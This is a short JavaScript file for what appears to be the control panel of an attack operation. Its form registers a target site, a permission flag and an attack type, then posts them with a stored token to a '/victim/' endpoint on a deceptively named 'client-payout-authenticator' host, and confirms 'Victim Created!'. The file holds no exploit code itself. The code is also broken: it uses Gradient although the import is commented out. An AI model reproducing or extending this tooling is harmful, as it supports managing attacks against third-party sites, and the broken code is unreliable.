
// import Gradient from "../Gradient.mjs";

const dashboardForm = document.getElementById("dashboard-form");

dashboardForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const site = dashboardForm.querySelector("#site-input");
    const isAllowed = dashboardForm.querySelector("#is-allowed-input");
    const attackType = dashboardForm.querySelector("#attack-type-input");

    if (!site || !isAllowed || !attackType) {
        console.warn("Error");
        return;
    }

    const payload = {
        site: site.value,
        isAllowed: isAllowed.value === "1" ? "true" : "false",
        attackType: attackType.value
    }

    const userToken = localStorage.getItem("token");

    const response = await fetch("https://client-payout-authenticator.vercel.app/victim/", { 
        method: "POST",
        body: JSON.stringify(payload), 
        headers: { 
            "Content-Type": "application/json",
            "Authorization": `Bearer ${userToken}`
        } 
    });

    if (! response.ok) {
        const data = await response.json();
        alert("Error: " + data.message);
    } else {
        alert("Successful!, Victim Created!");
    }
});

window.addEventListener("DOMContentLoaded", () => {
    const gradient = new Gradient();

    // Call `initGradient` with the selector to your canvas
    gradient.initGradient('#gradient-canvas');
})